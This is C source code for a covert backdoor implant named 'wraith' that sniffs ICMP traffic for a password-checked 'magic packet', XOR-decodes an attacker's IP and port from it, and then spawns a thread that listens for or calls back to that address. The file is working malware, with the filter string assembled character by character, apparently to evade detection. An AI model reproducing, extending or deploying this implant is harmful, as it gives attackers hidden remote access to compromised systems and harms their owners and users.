#if USE_LIBPCAP
#include <pcap.h>
#endif
#include <pthread.h>
#include <safe_memset.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#include <sha256.h>
#include <wraith.h>


#define PASSWORD_SALT_LENGTH     16

/* Activation data embedded inside magic ICMP packet */
struct activation_command {
    char        salt[PASSWORD_SALT_LENGTH];         
    char        magic_hash[SHA256_DIGEST_LENGTH];
    uint32_t    ip_addr;
    uint16_t    port;
};

/* Arguments passed to session thread */
struct activation_args {
    bool        listen;
    uint32_t    ip;
    uint16_t    port;
};

/*
 * We use this to only allow for one magic-packet for minute. Prevents
 * duplicate packets from waking up the backdoor
 */
static time_t 
get_current_minute()
{
    time_t now;
    struct timespec tms;

    if (clock_gettime(CLOCK_REALTIME, &tms)) {
        return -1;
    }
    
    now = tms.tv_sec;

    return (time_t)now;
}

/* XOR key to apply against IP and port inside wakeup packet */
static uint32_t
get_xor_key()
{
    extern struct wraith_config_block implant_config;

    uint32_t c1;
    uint32_t c2;
    uint32_t c3;
    uint32_t c4;
    
    uint32_t hash[SHA256_DIGEST_LENGTH];

    calc_sha_256((uint8_t*)hash, implant_config.encrypted_config.activation_key, strlen(implant_config.encrypted_config.activation_key));

    c1 = hash[0];
    c2 = hash[1];
    c3 = hash[2];
    c4 = hash[3];

    safe_memset(hash, SHA256_DIGEST_LENGTH);

    return c1 ^ c2 ^ c3 ^ c4;
}

static void
init_session_thread(struct activation_args *args)
{
    DEBUG_PRINT("init_session_thread() reached");

    if (args->ip == 0) {
        perform_listen(0, args->port);
    } else {
        perform_callback(args->ip, args->port);
    }
}

static void
process_icmp(struct icmp *icmp)
{
    extern struct wraith_config_block implant_config;

    static uint64_t last_activation_time = 0;
    static struct activation_args args;
    static pthread_t session_thread;

    uint32_t xor;
    uint32_t ip;
    uint16_t port;
    uint64_t delta;

    struct activation_command *wakeup;

    size_t challenge_len;

    char challenge_hash[SHA256_DIGEST_LENGTH];
    char challenge[256];

    challenge_len = PASSWORD_SALT_LENGTH + strlen(implant_config.encrypted_config.activation_key);

    wakeup = (struct activation_command*)icmp->icmp_data;

    memcpy(challenge, wakeup->salt, PASSWORD_SALT_LENGTH);
    memcpy(&challenge[PASSWORD_SALT_LENGTH],
        implant_config.encrypted_config.activation_key,
        strlen(implant_config.encrypted_config.activation_key));


    calc_sha_256(challenge_hash, challenge, challenge_len);

    if (memcmp(wakeup->magic_hash, challenge_hash, SHA256_DIGEST_LENGTH) == 0) {
        delta = get_current_minute() - last_activation_time;

        /* Only can be activated once per minute... */
        if (delta < 60) {
            return;
        }

        last_activation_time = get_current_minute();

        wakeup = (struct activation_command*)icmp->icmp_data;
        xor = get_xor_key();

        ip = wakeup->ip_addr ^ xor;
        port = (wakeup->port ^ xor) & 0xFFFF;

        args.ip = ip;
        args.port = port;

        DEBUG_PRINT("Calling pthread_create here!");

        if (pthread_create(&session_thread, NULL, (void * (*)(void *))init_session_thread, &args) == 0) {
            DEBUG_PRINT("Great success!");
        } else {
            ERROR_PRINT("pthread_create() failed!");
        }
    }
    
    safe_memset(challenge_hash, SHA256_DIGEST_LENGTH);
}

#ifdef USE_LIBPCAP
void
sniff_icmp()
{
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];

    struct bpf_program fp;

    char filter_expr[5];

    filter_expr[0] = 'i';
    filter_expr[1] = 'c';
    filter_expr[2] = 'm';
    filter_expr[3] = 'p';
    filter_expr[4] = 0;
    
    struct pcap_pkthdr header;

    bpf_u_int32 mask;
    bpf_u_int32 net;

    char *dev = pcap_lookupdev(errbuf);
    DEBUG_PRINT("sniffing on %s\n", dev);
    if (dev) {
        if (pcap_lookupnet(dev, &net, &mask, errbuf) != -1) {
            ERROR_PRINT("could not get netmask");
            net = 0;
            mask = 0;
        }

        pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

        if (!handle) {
            ERROR_PRINT("couldn't open device!");
            return;
        }

        if (pcap_compile(handle, &fp, filter_expr, 0, net) == -1) {
            ERROR_PRINT("couldn't parse filter");
            return;
        }

        if (pcap_setfilter(handle, &fp) == -1) {
            ERROR_PRINT("couldn't install filter");
            return;
        }

        const u_char *packet;

        for (;;) {
            packet = pcap_next(handle, &header);
            
            if (packet) {
                struct ip *ip = (struct ip*)(packet + 14);
                struct icmp *icmp = (struct icmp*)((char*)ip + ip->ip_hl*4);
                process_icmp(icmp);
            }
        }

    } else {
        ERROR_PRINT("could not open default device!");
    }
}
#else
void
sniff_icmp()
{
    int read;
    int saddr_size;
    
    struct sockaddr saddr;
    struct in_addr in;
    struct ip *ip;
    struct icmp *icmp; 
    int sock;

    char buf[256];

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

    if (sock < 0) {
        ERROR_PRINT("Could not open socket! Bailing!");
        return;
    }

    for (;;) {
        read = recv(sock, buf, 128, 0);

        if (read > 0) {
            ip = (struct ip*)buf;
            icmp = (struct icmp*)((char*)ip + ip->ip_hl*4);
        
            process_icmp(icmp);

            memset(buf, 0, 256);
        }
    }
}
#endif
